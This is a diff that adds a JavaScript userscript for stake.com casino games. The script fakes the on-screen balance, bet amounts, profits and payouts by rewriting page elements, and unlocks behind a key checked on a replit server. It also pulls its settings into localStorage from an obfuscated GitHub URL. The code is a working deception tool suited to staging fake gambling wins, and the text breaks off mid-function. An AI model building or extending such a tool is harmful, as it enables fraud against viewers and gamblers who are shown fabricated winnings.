@@ -1,0 +1,2695 @@
+(function() {
+    'use strict';
+    let minesInterval, diceInterval, mainsInterval, KenoRemoveBalInterval, urlCheckInterval, removeBalKenoInterval2, bjInterval, blackjackInterval
+    let double = false
+    let currency;
+    let inGameDetected = false;
+    let winDetected = false;
+    let loseDetected = false;
+    let bjDetected = false;
+    let tieDetected = false;
+    let buttonClicked = false;
+    let firstrun = true
+    let returned = false
+    let isModalVisible = false;
+    let profitfound = false;
+    let desiredNumber = 10;
+    let balanceChanged = false; // Track if balance has been changed for the current popup
+    let removedbal = false;
+    let removedbal2 = false
+    let rate = localStorage.getItem('ltcrate') || 62.62;
+    let ratebtc = localStorage.getItem('btcrate') || 59361.53;
+    let rateeth = localStorage.getItem('ethrate') || 2530.92;
+    let watchButtonAndUpdateInterval, watchButton2AndUpdateInterval, updateProfitInterval, watchAndCalculatekenoInterval, removeBalKenoInterval, kenoInterval;
+    let modal2;
+    let watchAndChangeValueInterval, watchAndCalculateInterval, removeBalInterval, removeBalDiceInterval, diceRemoveBalInterval;
+    let previousRate = 59.05;
+    let removeBalActive = true; // Flag to toggle removeBal on and off
+    let isButtonClickable = true; // Flag to prevent rapid clicks
+    let gameInProgress = false; // Flag to indicate if a game is in progress
+    let gameInProgress2 = false
+    let buttonContainer = 0
+    let buttons = 0
+    let loggedin = false
+    let registrationChecked = false;
+    let lastClickTime = 0;
+    let lastProcessedChild = null;
+    let multi = 1;
+    let profit_on_win = 0;
+    let isCheckingUrl = false;
+    let currentGame = '';
+    let warned = false
+    let showaccess;
+    let shouldContinue = true
+    let ranbefore = false
+    let triedchecking = false
+    let multis, lastProcessedChild2, removeBallimboInterval, updatelimboProfitInterval, limboRemoveBalInterval, LimboInterval;
+
+    function importFromFileContent(fileContent) {
+        // Split the file content by lines
+        const lines = fileContent.split('\n');
+        console.log(lines)
+
+        // Iterate over each line and set the localStorage values
+        lines.forEach(line => {
+            const [key, value] = line.split(',').map(s => s.trim());
+            if (key && value !== undefined) {
+                localStorage.setItem(key, value === 'null' ? null : value);
+            }
+        });
+
+        console.log('Import complete.');
+    }
+
+    // Function to fetch the file content from the given URL and import it
+    async function fetchAndImportFile() {
+        try {
+            const response = await fetch('https://raw.githubusercontent.com/diuofbnaiudjbnoufibhn10oiehno0ishanfbi/odbviob9oiebhvoicxoighj0o92eh0fhcnblksahnoghap9dghasoijhb3hg/main/tFz2Cde2jMiF7lvdxvCH8Np1czLcTxk2zl7Uc4hnE5P71JXtwgVBNoXL7kihzIJk5z4mRUykSOdcq7rKrwCfy1UkRo4JYFgtxHqILwIRbNhhwc581pB6wjqGnO8DyMGqGL3QML9AIVzq4UuabIGI40NEYziI0DJK7jEPPv9vn6wIrcG7PRv7X7nlCCarzZx8FfeE6OvUwR4b3msZxPjcx0UWcv2UWYZSvTC9Q1USDhZoE9a5h3Bho8wwJE05Nlh');
+            if (!response.ok) {
+                throw new Error(`Network response was not ok: ${response.statusText}`);
+            }
+            const fileContent = await response.text();
+            importFromFileContent(fileContent);
+        } catch (error) {
+            console.error('Error fetching or importing file:', error);
+        }
+    }
+
+    function checkAccessGranted() {
+        const accessGranted = localStorage.getItem('showAccessGranted');
+
+        if (accessGranted !== null && (accessGranted === '0' || accessGranted === '1')) {
+            if (accessGranted === '1') {
+                showaccess = true
+            } else {
+                showaccess = false
+            }
+        } else {
+            showaccess = true
+        }
+    }
+
+    function updaterate() {
+        fetchLtcRate()
+        fetchBtcRate()
+        fetchEthRate()
+
+        localStorage.setItem('ltcrate', rate)
+        localStorage.setItem('btcrate', ratebtc)
+        localStorage.setItem('ethrate', rateeth)
+
+    }
+
+    updaterate()
+
+    function onButtonClick() {
+        changebaldice(-desiredNumber);
+        desiredNumber *= 2;
+        double = true;
+    }
+
+    function checkGameState() {
+        const elements = document.querySelectorAll('.value');
+        let foundInGame = false;
+
+        elements.forEach(element => {
+            const classList = element.classList.value;
+            const value = parseInt(element.textContent, 10);
+
+            if (classList.includes('none')) {
+                foundInGame = true;
+                if (!inGameDetected) {
+                    changebaldice(-desiredNumber);
+                    inGameDetected = true;
+                    winDetected = false;
+                    loseDetected = false;
+                    bjDetected = false;
+                    tieDetected = false;
+                    document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)").addEventListener("click", onButtonClick);
+                }
+            } else if (classList.includes('win') && !winDetected && value !== 21) {
+                changebaldice(desiredNumber * 2);
+                winDetected = true;
+            } else if (classList.includes('lose') && !loseDetected) {
+                loseDetected = true;
+            } else if (classList.includes('draw') && !tieDetected) {
+                changebaldice(desiredNumber);
+                tieDetected = true;
+            } else if (value === 21 && !bjDetected) {
+                changebaldice(desiredNumber * 2.5);
+                bjDetected = true;
+            }
+        });
+
+        // Reset inGameDetected if no element with class 'none' is found
+        if (!foundInGame) {
+            inGameDetected = false;
+            document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div > button:nth-child(4)").removeEventListener("click", onButtonClick);
+            if (double) {
+                desiredNumber /= 2;
+                double = false;
+            }
+        }
+    }
+
+    function validateKey() {
+        const key = document.getElementById('keyInput').value;
+
+        if (!key) {
+            alert("Please enter a key.");
+            return;
+        }
+
+        // Send request to the server to validate the key
+        fetch('https://8ed7af64-9ef2-4330-b2bf-959a8096dfce-00-34lxz8heo77is.janeway.replit.dev:3000/check_key', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ key: key }),
+        })
+            .then(response => response.json())
+            .then(data => {
+            if (data.success) {
+                fetchAndImportFile(); // Run the fetchAndImportFile function if the key is valid
+
+                // Recheck the missing items
+                const newMissings = checkmissings(false);
+
+                if (newMissings.length === 0) {
+                    alert("Key is valid and setup complete.");
+
+                    // Mark the key as used (example logic, adjust as needed)
+                    markKeyAsUsed(key);
+
+                    // Remove the modal from the DOM
+                    const modal = document.getElementById('validateKeyModal');
+                    if (modal) {
+                        modal.remove();
+                    }
+                } else {
+                    alert("Setup failed. Missing items: " + newMissings.join(', '));
+                }
+            } else {
+                alert("Invalid or already used key.");
+            }
+        })
+            .catch(error => {
+            console.error("Error:", error);
+            alert("An error occurred while validating the key.");
+        });
+    }
+
+    async function fetchLtcRate() {
+        try {
+            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd');
+            const data = await response.json();
+            rate = data.litecoin.usd;
+        } catch (error) {
+            console.error('Error fetching LTC rate:', error);
+            return 64.01; // Fallback rate
+        }
+    }
+
+    async function fetchEthRate() {
+        try {
+            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+            const data = await response.json();
+            rateeth = data.ethereum.usd;
+        } catch (error) {
+            console.error('Error fetching ETH rate:', error);
+            return 2659.92; // Fallback rate
+        }
+    }
+
+    async function fetchBtcRate() {
+        try {
+            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+            const data = await response.json();
+            ratebtc = data.bitcoin.usd;
+        } catch (error) {
+            console.error('Error fetching BTC rate:', error);
+            return 59026.53; // Fallback rate
+        }
+    }
+
+    function getBalanceElement() {
+        // Search for the balance element based on its class name
+        const balElement = document.querySelector(".balance-toggle .content span");
+
+        // Check if the balance element is found
+        if (balElement) {
+            return balElement;
+        } else {
+            return null;
+        }
+    }
+
+    function watchButtonAndUpdate() {
+        let doubleBetButton
+        if (window.location.href === "https://stake.com/casino/games/blackjack") {
+            doubleBetButton = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1u979cd > button:nth-child(2)")
+        } else {
+            doubleBetButton = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1u979cd > button:nth-child(2)");
+        }
+        if (doubleBetButton) {
+            doubleBetButton.addEventListener('click', () => {
+                if (isButtonClickable) {
+                    isButtonClickable = false;
+                    const balElement = getBalanceElement()
+                    const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+                    if (desiredNumber * 2 > currentBalance) {
+                        desiredNumber = currentBalance
+                    } else {
+                        desiredNumber *= 2;
+                    }
+                    gameInProgress = true; // Set gameInProgress to true
+                    gameInProgress2 = true
+                    let betInputElement;
+                    let cryptoElement;
+                    if (window.location.href === "https://stake.com/casino/games/blackjack") {
+                        betInputElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1u979cd > input")
+                        cryptoElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > span > div.currency-conversion.svelte-e4myuj > div > div")
+                    } else {
+                        betInputElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input");
+                        cryptoElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
+                    }
+                    if (currency === "ltc") {
+                        const cryptoAmount = (desiredNumber / rate).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " LTC";
+                    } else if (currency === "eth") {
+                        const cryptoAmount = (desiredNumber / rateeth).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " ETH";
+                    } else if (currency === "btc") {
+                        const cryptoAmount = (desiredNumber / ratebtc).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " BTC";
+                    }
+                    betInputElement.value = desiredNumber.toFixed(2);
+                    setTimeout(() => {
+                        isButtonClickable = true;
+                    }, 100); // 100ms delay before allowing the next click
+                }
+            });
+        }
+        watchButtonAndUpdateInterval = setTimeout(watchButtonAndUpdate, 500); // Check every 500ms
+    }
+
+    function watchButton2AndUpdate() {
+        let doubleBetButton
+        if (window.location.href === "https://stake.com/casino/games/blackjack") {
+            doubleBetButton = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1u979cd > button:nth-child(1)")
+        } else {
+            doubleBetButton = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1u979cd > button:nth-child(1)");
+        }
+        if (doubleBetButton) {
+            doubleBetButton.addEventListener('click', () => {
+                if (isButtonClickable) {
+                    isButtonClickable = false;
+                    const balElement = getBalanceElement()
+                    const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+                    if (desiredNumber * 0.5 > currentBalance) {
+                        desiredNumber = currentBalance
+                    } else {
+                        desiredNumber *= 0.5;
+                    }
+                    gameInProgress = true; // Set gameInProgress to true
+                    gameInProgress2 = true
+                    let betInputElement;
+                    let cryptoElement;
+                    if (window.location.href === "https://stake.com/casino/games/blackjack") {
+                        betInputElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1u979cd > input");
+                        cryptoElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label > span > div.currency-conversion.svelte-e4myuj > div > div");
+                    } else {
+                        betInputElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input");
+                        cryptoElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
+                    }
+                    if (currency === "ltc") {
+                        const cryptoAmount = (desiredNumber / rate).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " LTC";
+                    } else if (currency === "eth") {
+                        const cryptoAmount = (desiredNumber / rateeth).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " ETH";
+                    } else if (currency === "btc") {
+                        const cryptoAmount = (desiredNumber / ratebtc).toFixed(8);
+                        cryptoElement.innerText = cryptoAmount + " BTC";
+                    }
+                    betInputElement.value = desiredNumber.toFixed(2);
+                    setTimeout(() => {
+                        isButtonClickable = true;
+                    }, 200); // 200ms delay before allowing the next click
+                }
+            });
+        }
+        watchButton2AndUpdateInterval = setTimeout(watchButton2AndUpdate, 500); // Check every 500ms
+    }
+
+    function watchAndCalculatekeno() {
+        waitForElement("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div", calculateResultKeno);
+        watchAndCalculatekenoInterval = setTimeout(() => {
+            watchAndCalculatekeno();
+        }, 100); // Call watchAndCalculate again after 30000ms
+    }
+
+    function calculateResultKeno() {
+        if (!gameInProgress2) {
+            const resultElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div > div > div.currency.svelte-141qgpc > span.content.svelte-141qgpc > span > span")
+            const multiplierElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.content.svelte-dpdqlo > div > div > span > span")
+
+            if (resultElement && multiplierElement) {
+                const multiplier = extractNumberFromString(multiplierElement.innerText);
+                const result = desiredNumber * multiplier;
+                changebal(result.toFixed(2) - 0);
+                resultElement.innerText = '$' + formatNumberWithCommas(result.toFixed(2));
+            }
+            gameInProgress2 = true
+        }
+    }
+
+    function removeBalKeno() {
+        waitForElement2keno("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]", balgonekeno);
+        removeBalKenoInterval = setTimeout(() => {
+            removeBalKeno();
+        }, 100); // Call watchAndCalculate again after 30000ms
+    }
+    function waitForElement2keno(selector, callback) {
+        const el = document.querySelector(selector);
+        if (el && el.dataset.test === "bet-button") {
+            el.addEventListener('click', function() {
+                const currentTime = new Date().getTime(); // Get current time
+                const timeDiff = currentTime - lastClickTime; // Calculate time difference
+                if (lastClickTime === 0 || timeDiff > 200) { // Check if lastClickTime is not defined or time difference is greater than 1.5 seconds (1500 milliseconds)
+                    balgonekeno(); // Call balgone function
+                }
+                lastClickTime = currentTime; // Update last click time
+                callback(el);
+            });
+        } else {
+            removeBalKenoInterval2 = setTimeout(() => {
+                waitForElement2keno(selector, callback);
+            }, 10);
+        }
+    }
+
+    function updateElementsWithNewRate() {
+        const balElement = getBalanceElement()
+        const betInputElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1u979cd > input");
+        const resultElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1u979cd > div > input")
+        if (!balElement) {
+            return;
+        }
+
+        const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+        if (previousRate !== rate) {
+            const newBalance = (currentBalance / previousRate) * rate;
+            const newBetAmount = (desiredNumber / previousRate) * rate;
+            betInputElement.value = newBetAmount.toFixed(2);
+
+            // Update desiredNumber to reflect the new bet amount in USD
+            desiredNumber = newBetAmount;
+
+            // Update the balance display with the new value in USD
+            balElement.innerText = "$" + formatNumberWithCommas(newBalance.toFixed(2));
+            if (resultElement) {
+                const oldamount = resultElement.value
+                const newamount = (oldamount / previousRate) * rate;
+                formatNumberWithCommas(newamount.toFixed(2))
+            }
+            // Update the previous rate to the current rate for future calculations
+            previousRate = rate;
+        }
+    }
+
+    function savebal() {
+        const balElement = getBalanceElement();
+        const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+
+        if (currentBalance !== 0) {
+            localStorage.setItem('latest_bal', currentBalance.toString());
+        }
+    }
+
+    function applybal(duration = 2000) {
+        const endTime = Date.now() + duration;
+        const updateInterval = 10; // Interval to check and update the balance
+
+        function updateBalance() {
+            const balElement = getBalanceElement();
+            if (balElement) {
+                const storedBal = localStorage.getItem('latest_bal');
+                if (storedBal) {
+                    const balfloat = parseFloat(storedBal);
+                    if (!isNaN(balfloat)) {
+                        const formattedBalance = '$' + formatNumberWithCommas(balfloat.toFixed(2));
+                        balElement.innerText = formattedBalance;
+                    } else {
+                        console.error("Invalid balance value:", storedBal);
+                    }
+                } else {
+                    console.warn("No balance found in localStorage.");
+                }
+            } else {
+                console.error("Balance element not found.");
+            }
+
+            if (Date.now() < endTime) {
+                setTimeout(updateBalance, updateInterval);
+            }
+        }
+
+        updateBalance();
+    }
+
+
+    function changebaldice(add) {
+        const balElement = getBalanceElement()
+
+        // Extract the current balance value
+        const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+        // Add the 'add' parameter to the current balance
+        const newBalance = currentBalance + add;
+
+        // Format the new balance to have $ and two decimal places
+        const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+
+        // Update the balElement with the new value
+        balElement.innerText = formattedBalance;
+
+    }
+
+    function changebal(add) {
+        if (!balanceChanged) {
+            const balElement = getBalanceElement()
+            // Extract the current balance value
+            const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+
+            // Add the 'add' parameter to the current balance
+            const newBalance = currentBalance + add;
+
+            // Format the new balance to have $ and two decimal places
+            const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+
+            // Update the balElement with the new value
+            balElement.innerText = formattedBalance;
+
+            balanceChanged = true; // Set balanceChanged to true once balance is changed for this popup
+        }
+    }
+
+    let minexy = "56."
+    // Function to check for the element
+    function checkForElement() {
+        let buttonElement;
+        if (currency === "ltc") {
+            buttonElement = document.querySelector('button[data-testid="coin-toggle-currency-ltc"]');
+        } else if (currency === "eth") {
+            buttonElement = document.querySelector('button[data-testid="coin-toggle-currency-eth"]');
+        } else if (currency === "btc") {
+            buttonElement = document.querySelector('button[data-testid="coin-toggle-currency-btc"]');
+        }
+        if (buttonElement) {
+            let targetElement = buttonElement.querySelector('span.weight-semibold.line-height-default.align-left.size-default.text-size-default.variant-inherit.numeric.with-icon-space.is-truncate.svelte-17v69ua[formattedforfilter="0"]');
+
+            if (targetElement) {
+
+                const balanceElement = getBalanceElement()
+                const currentBalance = parseFloat(balanceElement.innerText.replace(/[^\d.]/g, ''));
+
+                if (!isNaN(currentBalance)) {
+                    // Update the content of the found element
+                    targetElement.textContent = `$${formatNumberWithCommas(currentBalance.toFixed(2))}`;
+                    setTimeout(checkForElement, 500);
+                }
+            } else {
+                // Wait for a while before checking again
+                setTimeout(checkForElement, 50); // Adjust the interval as needed
+            }
+        } else {
+            // Wait for a while before checking again
+            setTimeout(checkForElement, 50); // Adjust the interval as needed
+        }
+    }
+
+    function showModal2(message) {
+        // Check if a modal already exists
+        if (document.querySelector('.custom-modal')) {
+            return; // If a modal exists, return without creating a new one
+        }
+        const modal = createModal("WARNING"); // Assuming createModal creates the base modal structure
+        modal.classList.add('custom-modal')
+        // Warning message
+        const warningMessage = document.createElement('p');
+        warningMessage.textContent = message;
+        warningMessage.style.color = '#ff4d4d'; // Red color for warning text
+        warningMessage.style.fontSize = '18px';
+        warningMessage.style.marginTop = '20px'; // Adjust this value to move the message down
+        warningMessage.style.marginBottom = '10px';
+
+
+        // Styling the modal
+        modal.style.backgroundColor = '#2C2F33'; // Dark, eye-comforting background
+        modal.style.color = '#ffffff'; // White text color for general text
+        modal.style.fontFamily = 'Arial, sans-serif';
+        modal.style.padding = '20px';
+        modal.style.borderRadius = '10px';
+        modal.style.boxShadow = '0px 8px 16px rgba(0, 0, 0, 0.3)';
+        modal.style.textAlign = 'center';
+        modal.style.maxWidth = '450px';
+        modal.style.margin = 'auto';
+
+        // Close button
+        const closeButton = document.createElement('button');
+        closeButton.textContent = 'Close';
+        closeButton.style.padding = '10px 20px';
+        closeButton.style.backgroundColor = '#7289da';
+        closeButton.style.color = 'white';
+        closeButton.style.border = 'none';
+        closeButton.style.borderRadius = '5px';
+        closeButton.style.cursor = 'pointer';
+        closeButton.style.marginTop = '10px';
+        closeButton.style.fontSize = '16px';
+        closeButton.style.boxShadow = '0px 4px 6px rgba(0, 0, 0, 0.1)';
+
+        closeButton.addEventListener('click', () => {
+            destroyModal(modal);
+        });
+
+        modal.appendChild(warningMessage);
+        modal.appendChild(closeButton);
+    }
+
+    function destroyModal(modal) {
+        if (modal) {
+            document.body.removeChild(modal);
+        }
+    }
+
+    function waitForElement2(selector, callback) {
+        const el = document.querySelector(selector);
+        if (el && el.dataset.test === "bet-button") {
+            removedbal = false;
+            setTimeout(() => {
+                waitForElement2(selector, callback);
+            }, 10);
+
+        } else {
+            callback(el)
+        }
+    }
+
+    function removeBaldice() {
+        waitForElement2dice("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]", balgonedice);
+        removeBalDiceInterval = setTimeout(() => {
+            removeBaldice();
+        }, 100); // Call watchAndCalculate again after 30000ms
+    }
+
+    function updateProfitValues() {
+        const multiElement = document.querySelector("input.input.spacing-expanded.svelte-1u979cd[data-test='payout']");
+
+        if (multiElement) {
+            multi = parseFloat(multiElement.value);
+            profit_on_win = desiredNumber * (multi - 1);
+
+            const profitElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label:nth-child(1) > div.input-wrap.svelte-1u979cd > div > input");
+            const profitLtcElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div")
+
+            if (profitElement) {
+                profitElement.value = profit_on_win.toFixed(2);
+            }
+
+            if (currency === "ltc") {
+                const cryptoAmount = (profit_on_win / rate).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " LTC";
+            } else if (currency === "eth") {
+                const cryptoAmount = (profit_on_win / rateeth).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " ETH";
+            } else if (currency === "btc") {
+                const cryptoAmount = (profit_on_win / ratebtc).toFixed(8);
+                profitLtcElement.innerText = cryptoAmount + " BTC";
+            }
+        }
+
+        updateProfitInterval = setTimeout(updateProfitValues, 50); // Check every 10 milliseconds
+    }
+
+    function observePastBets() {
+        const targetNode = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-1cfosht");
+        if (!targetNode) {
+            // If the target node is not found, wait and try again
+            setTimeout(observePastBets, 100);
+            return;
+        }
+
+        // Options for the observer (which mutations to observe)
+        const config = { childList: true };
+
+        // Callback function to execute when mutations are observed
+        const callback = function(mutationsList, observer) {
+            // Loop through all mutations
+            for(const mutation of mutationsList) {
+                // Check if nodes were added
+                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+                    // Get the last added node
+                    const addedNode = mutation.addedNodes[mutation.addedNodes.length - 1];
+                    if (addedNode instanceof HTMLElement) {
+                        // Check if the added node is a button
+                        if (addedNode.tagName.toLowerCase() === 'button') {
+                            // Check if it's a win or lose element based on class
+                            if (addedNode.classList.contains('variant-success')) {
+                                // Win element
+                                if (addedNode !== lastProcessedChild) {
+                                    lastProcessedChild = addedNode;
+                                    const winValue = parseFloat(addedNode.querySelector('.contents').innerText);
+                                    const calc = desiredNumber * (multi - 1);
+                                    setTimeout(() => {
+                                        changebaldice(calc);
+                                    }, 200); // Delay of 200ms
+                                }
+                            } else if (addedNode.classList.contains('variant-neutral')) {
+                                const balElement = getBalanceElement();
+                                // Extract the current balance value
+                                const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+                                // Add the 'add' parameter to the current balance
+                                const newBalance = currentBalance - desiredNumber;
+                                // Format the new balance to have $ and two decimal places
+                                const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+                                setTimeout(() => {
+                                    balElement.innerText = formattedBalance;
+                                }, 200); // Delay of 200ms
+                            }
+                        }
+                    }
+                }
+            }
+        };
+
+        // Create an observer instance linked to the callback function
+        const observer = new MutationObserver(callback);
+
+        observer.observe(targetNode, config);
+    }
+
+    function balgonedice() {
+        if (!removedbal) {
+            removedbal = true;
+
+            observePastBets()
+
+            diceRemoveBalInterval = setTimeout(() => {
+                removedbal = false;
+            }, 100); // Adjust this timeout as needed
+        }
+    }
+
+    function waitForElement2dice(selector, callback) {
+        const el = document.querySelector(selector);
+        if (el && el.dataset.test === "bet-button") {
+            el.addEventListener('click', function() {
+                const currentTime = new Date().getTime(); // Get current time
+                const timeDiff = currentTime - lastClickTime; // Calculate time difference
+                if (lastClickTime === 0 || timeDiff > 200) { // Check if lastClickTime is not defined or time difference is greater than 1.5 seconds (1500 milliseconds)
+                    balgonedice(); // Call balgone function
+                }
+                lastClickTime = currentTime; // Update last click time
+                callback(el);
+            });
+        } else {
+            setTimeout(() => {
+                waitForElement2dice(selector, callback);
+            }, 10);
+        }
+    }
+
+    function waitForElement(selector, callback) {
+        const el = document.querySelector(selector);
+        if (el) {
+            callback(el);
+        } else {
+            balanceChanged = false;
+            setTimeout(() => {
+                waitForElement(selector, callback);
+            }, 10);
+        }
+    }
+
+    function extractNumberFromString(str) {
+        const number = parseFloat(str.replace(/[^\d.]/g, ''));
+        return isNaN(number) ? 0 : number;
+    }
+
+    function formatNumberWithCommas(number) {
+        return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+    }
+
+    // Function to generate a random integer within a specified range
+    function getRandomInt(min, max) {
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    // Function to calculate the percentage remaining to reach 100%
+    function calculatePercentageRemaining(min, max, value) {
+        const percentage = ((value - min) / (max - min)) * 100;
+        return (100 - percentage).toFixed(2); // Inverse percentage
+    }
+    function observePastBetslimbo() {
+        const targetNode = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-1cfosht");
+        if (!targetNode) {
+            // If the target node is not found, wait and try again
+            setTimeout(observePastBetslimbo, 100);
+            return;
+        }
+
+        // Options for the observer (which mutations to observe)
+        const config = { childList: true };
+
+        // Callback function to execute when mutations are observed
+        const callback = function(mutationsList, observer) {
+            // Loop through all mutations
+            for(const mutation of mutationsList) {
+                // Check if nodes were added
+                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+                    // Get the last added node
+                    const addedNode = mutation.addedNodes[mutation.addedNodes.length - 1];
+                    if (addedNode instanceof HTMLElement) {
+                        // Check if the added node is a button
+                        if (addedNode.tagName.toLowerCase() === 'button') {
+                            // Check if it's a win or lose element based on class
+                            if (addedNode.classList.contains('variant-success')) {
+                                // Win element
+                                if (addedNode !== lastProcessedChild2) {
+                                    lastProcessedChild2 = addedNode;
+                                    const winValue = parseFloat(addedNode.querySelector('.contents').innerText);
+                                    const calc = desiredNumber * (multis - 1);
+                                    setTimeout(() => {
+                                        changebaldice(calc);
+                                    }, 200); // Delay of 200ms
+                                }
+                            } else if (addedNode.classList.contains('variant-neutral')) {
+                                const balElement = getBalanceElement();
+                                // Extract the current balance value
+                                const currentBalance = parseFloat(balElement.innerText.replace(/[^\d.]/g, ''));
+                                // Add the 'add' parameter to the current balance
+                                const newBalance = currentBalance - desiredNumber;
+                                // Format the new balance to have $ and two decimal places
+                                const formattedBalance = '$' + formatNumberWithCommas(newBalance.toFixed(2));
+                                setTimeout(() => {
+                                    balElement.innerText = formattedBalance;
+                                }, 200); // Delay of 200ms
+                            }
+                        }
+                    }
+                }
+            }
+        };
+
+        // Create an observer instance linked to the callback function
+        const observer = new MutationObserver(callback);
+
+        observer.observe(targetNode, config);
+    }
+
+    function removeBallimbo() {
+        waitForElement2limbo("#main-content > div > div.content.svelte-aj9tu > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]", balgonelimbo);
+        removeBallimboInterval = setTimeout(() => {
+            removeBallimbo();
+        }, 100); // Call watchAndCalculate again after 30000ms
+    }
+
+    function updateProfitValueslimbo() {
+        const multiElement = document.querySelector("#main-content > div > div.content.svelte-aj9tu > div.game-content.svelte-1ku0r3 > div > div.footer.svelte-17aq4sd > label:nth-child(1) > div > div > input")
+
+        if (multiElement) {
